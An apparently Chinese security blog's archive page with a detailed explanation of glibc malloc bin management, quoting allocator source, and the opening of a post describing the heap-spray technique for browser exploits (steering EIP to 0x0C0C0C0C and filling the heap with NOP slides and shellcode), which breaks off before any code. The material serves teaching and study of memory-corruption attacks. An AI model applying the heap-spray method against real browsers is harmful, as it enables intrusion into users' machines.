<!DOCTYPE html>




<html class="theme-next mist" lang="zh-Hans">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />






  <link rel="alternate" href="/atom.xml" title="Introspelliam" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta name="description" content="Try your best!">
<meta property="og:type" content="website">
<meta property="og:title" content="Introspelliam">
<meta property="og:url" content="http://yoursite.com/page/7/index.html">
<meta property="og:site_name" content="Introspelliam">
<meta property="og:description" content="Try your best!">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Introspelliam">
<meta name="twitter:description" content="Try your best!">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.2',
    sidebar: {"position":"right","display":"always","offset":0,"offset_float":0,"b2t":true,"scrollpercent":true,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: false,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/7/"/>





  <title>Introspelliam - Just do what works for you, because there will always be someone who thinks differently.</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Introspelliam</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">Just do what works for you, because there will always be someone who thinks differently.</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/15/pwn/Linux堆内存管理深入分析下/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Introspelliam">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/15/pwn/Linux堆内存管理深入分析下/" itemprop="url">Linux堆内存管理深入分析下</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-15T19:31:03+08:00">
                2017-09-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0-前言回顾"><a href="#0-前言回顾" class="headerlink" title="0 前言回顾"></a>0 前言回顾</h2><p>在上一篇文章中（链接见文章底部），详细介绍了堆内存管理中涉及到的基本概念以及相互关系，同时也着重介绍了堆中chunk分配和释放策略中使用到的隐式链表技术。通过前面的介绍，我们知道使用隐式链表来管理内存chunk总会涉及到内存的遍历，效率极低。对此glibc malloc引入了显示链表技术来提高堆内存分配和释放的效率。</p>
<p>所谓的显示链表就是我们在数据结构中常用的链表，而链表本质上就是将一些属性相同的“结点”串联起来，方便管理。在glibc malloc中这些链表统称为bin，链表中的“结点”就是各个chunk，结点的共同属性就是：</p>
<ul>
<li>均为free chunk；</li>
</ul>
<ul>
<li>同一个链表中各个chunk的大小相等(有一个特例，详情见后文)。</li>
</ul>
<h2 id="1-bin介绍"><a href="#1-bin介绍" class="headerlink" title="1 bin介绍"></a>1 bin介绍</h2><p>如前文所述，<font color="#f00"><strong>bin是一种记录free chunk的链表数据结构</strong></font>。系统针对不同大小的free chunk，将bin分为了4类：1) Fast bin; 2) Unsorted bin; 3) Small bin; 4) Large bin。</p>
<p>在glibc中用于记录bin的数据结构有两种，分别如下所示：</p>
<p><strong>fastbinsY</strong>: 这是一个数组，用于记录所有的fast bins；</p>
<p><strong>bins</strong>: 这也是一个数组，用于记录除fast bins之外的所有bins。事实上，一共有126个bins，分别是：</p>
<ul>
<li>bin 1 为unsorted bin;</li>
</ul>
<ul>
<li>bin 2 到63为small bin;</li>
</ul>
<ul>
<li>bin 64到126为large bin。</li>
</ul>
<p>其中具体数据结构定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></div><div class="line">&#123;</div><div class="line">  ……</div><div class="line">  <span class="comment">/* Fastbins */</span></div><div class="line">  mfastbinptr fastbinsY[NFASTBINS];</div><div class="line">  ……</div><div class="line">  <span class="comment">/* Normal bins packed as described above */</span></div><div class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  <span class="comment">// #define NBINS    128</span></div><div class="line">  ……</div><div class="line">&#125;;</div><div class="line">这里mfastbinptr的定义：<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></div><div class="line">mchunkptr的定义：<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></div></pre></td></tr></table></figure>
<p>画图更直观：</p>
<p><img src="/images/2017-09-15/420rbsdeo2o0.png" alt=""></p>
<p>那么处于bins中个各个free chunk是如何链接在一起的呢？回顾malloc_chunk的数据结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></div><div class="line">  <span class="comment">/* #define INTERNAL_SIZE_T size_t */</span></div><div class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></div><div class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* 这两个指针只在free chunk中存在*/</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></div><div class="line"> </div><div class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>其中的fd和bk指针就是指向当前chunk所属的链表中forward或者backward chunk。</p>
<h2 id="2-Fast-bin"><a href="#2-Fast-bin" class="headerlink" title="2 Fast bin"></a>2 Fast bin</h2><p>既然有fast bin，那就肯定有fast chunk——chunk size为<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1249" target="_blank" rel="external">16</a>到<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1600" target="_blank" rel="external">80</a>字节的chunk就叫做fast chunk。为了便于后文描述，这里对chunk大小做如下约定：</p>
<p>1)      只要说到chunk size，那么就表示该malloc_chunk的实际整体大小；</p>
<p>2)      <strong>而说到chunk unused size，就表示该malloc_chunk中刨除诸如prev_size, size, fd和bk这类辅助成员之后的实际可用的大小。因此，对free chunk而言，其实际可用大小总是比实际整体大小少16字节。</strong></p>
<p>在内存分配和释放过程中，fast bin是所有bin中操作速度最快的。下面详细介绍fast bin的一些特性：</p>
<p>1) fast bin的个数——10个</p>
<p>2)每个fast bin都是一个单链表(<strong>只使用fd指针</strong>)。为什么使用单链表呢？因为在fast bin中无论是添加还是移除fast chunk，都是对“<strong>链表尾</strong>”进行操作，而不会对某个中间的fast chunk进行操作。更具体点就是LIFO(后入先出)算法：添加操作(free内存)就是将新的fast chunk加入链表尾，删除操作(malloc内存)就是将链表尾部的fast chunk删除。需要注意的是，为了实现LIFO算法，fastbinsY数组中每个fastbin元素均指向了该链表的rear end（尾结点），而尾结点通过其fd指针指向前一个结点，依次类推，如图所示。</p>
<p>在main arena中Fast bins(即数组fastbinsY)的整体操作示意图如下图所示：</p>
<p><img src="/images/2017-09-15/420rc04q9ad0.png" alt=""></p>
<p>​                        图2-1 fast bin示意图</p>
<p>3) chunk size：10个fast bin中所包含的fast chunk size是按照步进8字节排列的，即第一个fast bin中所有fast chunk size均为16字节，第二个fast bin中为24字节，依次类推。在进行malloc初始化的时候，最大的fast chunk size被设置为80字节(chunk unused size为64字节)，因此<strong>默认情况下大小为16到80字节的chunk被分类到fast chunk</strong>。详情如上图</p>
<p>4) 不会对free chunk进行合并操作。鉴于设计fast bin的初衷就是进行快速的<strong>小内存</strong>分配和释放，因此系统将属于fast bin的chunk的P(未使用标志位)总是设置为1，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜。</p>
<p>5) malloc(fast chunk)操作：即用户通过malloc请求的大小属于fast chunk的大小范围(注意：用户请求size加上16字节就是实际内存chunk size)。在初始化的时候fast bin支持的最大内存大小以及所有fast bin链表都是空的，所以当最开始使用malloc申请内存的时候，即使申请的内存大小属于fast chunk的内存大小(即16到80字节)，它也不会交由fast bin来处理，而是向下传递交由small bin来处理，如果small bin也为空的话就交给unsorted bin处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Maximum size of memory handled in fastbins.  */</span></div><div class="line"><span class="keyword">static</span> INTERNAL_SIZE_T global_max_fast;</div><div class="line"> </div><div class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></div><div class="line"><span class="comment">/*这里SIZE_SZ就是sizeof(size_t)，在32位系统为4，64位为8，fastbin_index就是根据要malloc的size来快速计算该size应该属于哪一个fast bin，即该fast bin的索引。因为fast bin中chunk是从16字节开始的，所有这里以8字节为单位(32位系统为例)有减2*8 = 16的操作！*/</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></div><div class="line">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</div><div class="line"> </div><div class="line"> </div><div class="line"><span class="comment">/* The maximum fastbin request size we support */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></div><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></div></pre></td></tr></table></figure>
<p>那么fast bin 是在哪？怎么进行初始化的呢？当我们第一次调用malloc(fast bin)的时候，系统执行_int_malloc函数，该函数首先会发现当前fast bin为空，就转交给small bin处理，进而又发现small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化，malloc_consolidate函数主要完成以下几个功能：</p>
<ul>
<li>首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。</li>
</ul>
<ul>
<li>malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins(构建双链表，详情见后文small bins介绍)，再初始化fast bins。</li>
</ul>
<p>然后当再次执行malloc(fast chunk)函数的时候，此时fast bin相关数据不为空了，就开始使用fast bin(见下面代码中的※1部分)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</div><div class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</div><div class="line">&#123;</div><div class="line">  ……</div><div class="line">  <span class="comment">/*</span></div><div class="line">     If the size qualifies as a fastbin, first check corresponding bin.</div><div class="line">     This code is safe to execute even if av is not yet initialized, so we</div><div class="line">     can try it without checking, which saves some time on this fast path.</div><div class="line">   */</div><div class="line">   <span class="comment">//第一次执行malloc(fast chunk)时这里判断为false，因为此时get_max_fast ()为0</span></div><div class="line">   <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</div><div class="line">    &#123;</div><div class="line">  ※<span class="number">1</span>  idx = fastbin_index (nb);</div><div class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</div><div class="line">      mchunkptr pp = *fb;</div><div class="line">      <span class="keyword">do</span></div><div class="line">        &#123;</div><div class="line">          victim = pp;</div><div class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">   ※<span class="number">2</span> <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))!= victim);</div><div class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</div><div class="line">            &#123;</div><div class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</div><div class="line">            errout:</div><div class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim));</div><div class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">            &#125;</div><div class="line">          check_remalloced_chunk (av, victim, nb);</div><div class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</div><div class="line">          alloc_perturb (p, bytes);</div><div class="line">          <span class="keyword">return</span> p;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>得到第一个来自于fast bin的chunk之后，系统就将该chunk从对应的fast bin中移除，并将其地址返回给用户，见上面代码※2处。</p>
<p>6) free(fast chunk)操作：这个操作很简单，主要分为两步：先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小；然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。</p>
<h2 id="3-Unsorted-bin"><a href="#3-Unsorted-bin" class="headerlink" title="3 Unsorted bin"></a>3 Unsorted bin</h2><p>当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中(为什么，在什么情况下会发生这种事情呢？详情见后文)，系统就将这些chunk添加到unsorted bin中。为什么要这么做呢？这主要是为了让“glibc malloc机制”能够有第二次机会重新利用最近释放的chunk(第一次机会就是fast bin机制)。利用unsorted bin，可以加快内存的分配和释放操作，因为整个操作都不再需要花费额外的时间去查找合适的bin了。</p>
<p>Unsorted bin的特性如下：</p>
<p>1) unsorted bin的个数： 1个。unsorted bin是一个由free chunks组成的循环双链表。</p>
<p>2) Chunk size: 在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。这就是前言说的特例了，不过特例并非仅仅这一个，后文会介绍。</p>
<h2 id="4-Small-bin"><a href="#4-Small-bin" class="headerlink" title="4 Small bin"></a>4 Small bin</h2><p>小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。</p>
<p>Small bin的特性如下：</p>
<p>1) small bin个数：62个。每个small bin也是一个由对应free chunk组成的循环双链表。同时Small bin采用FIFO(先入先出)算法：内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk。</p>
<p>2) chunk size: 同一个small bin中所有chunk大小是一样的，且第一个small bin中chunk大小为16字节，后续每个small bin中chunk的大小依次增加8字节，即最后一个small bin的chunk为16 + 61*8 = 508字节。</p>
<p>3) 合并操作：相邻的free chunk需要进行合并操作，即合并成一个大的free chunk。具体操作见下文free(small chunk)介绍。</p>
<p>4) malloc(small chunk)操作：类似于fast bins，最初所有的small bin都是空的，因此在对这些small bin完成初始化之前，即使用户请求的内存大小属于small chunk也不会交由small bin进行处理，而是交由unsorted bin处理，如果unsorted bin也不能处理的话，glibc malloc就依次遍历后续的所有bins，找出第一个满足要求的bin，如果所有的bin都不满足的话，就转而使用top chunk，如果top chunk大小不够，那么就扩充top chunk，这样就一定能满足需求了(还记得上一篇文章中在Top Chunk中留下的问题么？答案就在这里)。注意遍历后续bins以及之后的操作同样被large bin所使用，因此，将这部分内容放到large bin的malloc操作中加以介绍。</p>
<p>那么glibc malloc是如何初始化这些bins的呢？因为这些bin属于malloc_state结构体，所以在初始化malloc_state的时候就会对这些bin进行初始化，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">malloc_init_state (mstate av)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> i;</div><div class="line">  mbinptr bin;</div><div class="line"> </div><div class="line">  <span class="comment">/* Establish circular links for normal bins */</span></div><div class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</div><div class="line">    &#123;</div><div class="line">      bin = bin_at (av, i);</div><div class="line">      bin-&gt;fd = bin-&gt;bk = bin;</div><div class="line">	&#125;</div><div class="line">……</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意在malloc源码中，将bins数组中的<strong>第一个成员索引值设置为了**</strong>1**，而不是我们常用的0(在bin_at宏中，自动将i进行了减1处理…)。从上面代码可以看出在初始化的时候glibc malloc将所有bin的指针都指向了自己——这就代表这些bin都是空的。</p>
<p>过后，当再次调用malloc(small chunk)的时候，如果该chunk size对应的small bin不为空，就从该small bin链表中取得small chunk，否则就需要交给unsorted bin及之后的逻辑来处理了。</p>
<p>5) free(small chunk)：当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，<strong>最后将新的chunk添加到unsorted bin中</strong>。</p>
<h2 id="5-Large-bin"><a href="#5-Large-bin" class="headerlink" title="5 Large bin"></a>5 Large bin</h2><p>大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。</p>
<p>Large bin的特性如下：</p>
<p>1) large bin的数量：63个。Large bin类似于small bin，只是需要注意两点：一是同一个large bin中每个chunk的大小可以不一样，但必须处于某个给定的范围(特例2) ；二是large chunk可以添加、删除在large bin的任何一个位置。</p>
<p>在这63个large bins中，前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。</p>
<p>鉴于同一个large bin中每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个large bin中的所有chunk按照chunk size进行<strong>从大到小的排列</strong>：最大的chunk放在链表的front end，最小的chunk放在rear end。</p>
<p>2) 合并操作：类似于small bin。</p>
<p>3) malloc(large chunk)操作：</p>
<p>初始化完成之前的操作类似于small bin，这里主要讨论large bins初始化完成之后的操作。首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk<strong>添加到unsorted bin</strong>中。</p>
<p>如果该large bin中最大的chunk的size小于用户请求的size的话，那么就依次查看后续的large bin中是否有满足需求的chunk，不过需要注意的是鉴于bin的个数较多(不同bin中的chunk极有可能在不同的内存页中)，如果按照上一段中介绍的方法进行遍历的话(即遍历每个bin中的chunk)，就可能会发生多次内存页中断操作，进而严重影响检索速度，所以glibc malloc设计了Binmap结构体来帮助提高bin-by-bin检索的速度。Binmap记录了各个bin中是否为空，通过binmap可以避免检索一些空的bin。如果通过binmap找到了下一个非空的large bin的话，就按照上一段中的方法分配chunk，否则就使用top chunk来分配合适的内存。</p>
<p>4) Free(large chunk)：类似于small chunk。</p>
<p>了解上面知识之后，再结合下图5-1，就不难理解各类bins的处理逻辑了：</p>
<p><img src="/images/2017-09-15/420rc31ppb10.jpg" alt=""></p>
<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h2><p>至此glibc malloc中涉及到的所有显示链表技术已经介绍完毕。鉴于篇幅和精力有限，本文没能详细介绍完所有的技术细节，但是我相信带着这些知识点再去研究glibc malloc的话，定能起到事半功倍的效果。</p>
<p>另外，就我个人所了解到的基于堆溢出攻击而言，掌握以上知识，已经足够理解绝大部分堆溢出攻击技术了。因此，后面的文章将会结合这些知识详细介绍各个攻击技术的实现原理。</p>
<p>老规矩：如有错误，欢迎斧正！</p>
<p><strong>作者：走位@阿里聚安全，更多安全技术文章，请点击</strong><a href="https://jaq.alibaba.com/community/index" target="_blank" rel="external"><strong>阿里聚安全博客 </strong></a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/10/0day/Heap-Spray-堆与栈的协同攻击/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Introspelliam">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/10/0day/Heap-Spray-堆与栈的协同攻击/" itemprop="url">Heap Spray: 堆与栈的协同攻击</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-10T11:27:08+08:00">
                2017-09-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>针对浏览器的攻击中，常常会结合使用堆和栈协同利用漏洞</p>
<ol>
<li>当浏览器或其使用ActiveX空间中存在溢出漏洞时，攻击者就可以生成一个特殊的HTML文件来触发这个漏洞。</li>
<li>不管是堆溢出还是栈溢出，漏洞触发后最终能够获得EIP</li>
<li>有时我们可能很难在浏览器中复杂的内存环境中布置完整的shellcode</li>
<li>页面中的Javascript可以申请堆内存，因此把shellcode通过Javascript布置在堆中成为可能</li>
</ol>
<p>在使用Heap Spray，一般会将EIP指向堆区的0x0C0C0C0C位置，然后用JavaScript申请大量堆内存，并用包含着0x90的“内存片”覆盖这些内存</p>
<p>通常JavaScript从内存地址向内存高址分配内存，因此申请的内存超过200MB（200MB=200 X 1024 X 1024=0x0C800000 &gt; 0x0C0C0C0C）后，0x0C0C0C0C将被含有shellcode的内存片覆盖。只要内存片中的0x90能够命中0x0C0C0C0C位置，shellcode就能执行。</p>
<p>可以用下面的方式覆盖内存</p>
